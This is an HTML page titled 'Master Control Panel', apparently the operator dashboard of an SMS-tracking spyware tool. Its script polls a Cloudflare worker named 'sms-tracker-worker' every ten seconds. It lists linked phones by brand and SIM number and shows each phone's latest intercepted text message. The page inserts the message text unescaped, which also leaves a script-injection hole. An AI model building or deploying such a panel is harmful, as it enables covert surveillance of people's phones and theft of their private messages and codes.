<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Control Panel</title>
    <style>
        body { background-color: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        h1 { text-shadow: 0 0 10px #ff0055; margin-bottom: 30px; }
        .device-card { 
            background: #111; border: 1px solid #ff0055; border-radius: 10px; 
            padding: 15px; margin: 10px auto; max-width: 500px; text-align: left;
            box-shadow: 0 0 5px #ff0055;
        }
        .status-online { color: #00ff00; font-weight: bold; }
        .msg-box { background: #222; padding: 10px; margin-top: 10px; border-radius: 5px; color: #fff; font-size: 14px; }
        .refresh-btn { background: #ff0055; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <h1>MASTER CONTROL PANEL</h1>
    <button class="refresh-btn" onclick="fetchDevices()">REFRESH DATA</button>

    <div id="deviceList">
        <p>Scanning for active devices...</p>
    </div>

    <script>
        // ✅ APNA WORKER URL YAHAN DAALEIN
        const API_URL = "https://sms-tracker-worker.vikash6759ub.workers.dev/api/get-data";

        async function fetchDevices() {
            try {
                const response = await fetch(API_URL);
                const data = await response.json();
                const container = document.getElementById('deviceList');
                container.innerHTML = "";

                if (data.length === 0) {
                    container.innerHTML = "<p>No devices linked yet.</p>";
                    return;
                }

                data.forEach(device => {
                    const card = document.createElement('div');
                    card.className = 'device-card';
                    card.innerHTML = `
                        <div><strong>Device:</strong> ${device.brand}</div>
                        <div><strong>Mobile:</strong> ${device.sim_info}</div>
                        <div><strong>Status:</strong> <span class="status-online">ONLINE</span></div>
                        <div class="msg-box">
                            <strong>Latest SMS:</strong><br>
                            ${device.last_msg || "Waiting for messages..."}
                        </div>
                    `;
                    container.appendChild(card);
                });
            } catch (error) {
                console.error("Error fetching data:", error);
            }
        }

        // Auto refresh every 10 seconds
        setInterval(fetchDevices, 10000);
        fetchDevices();
    </script>
</body>
</html>
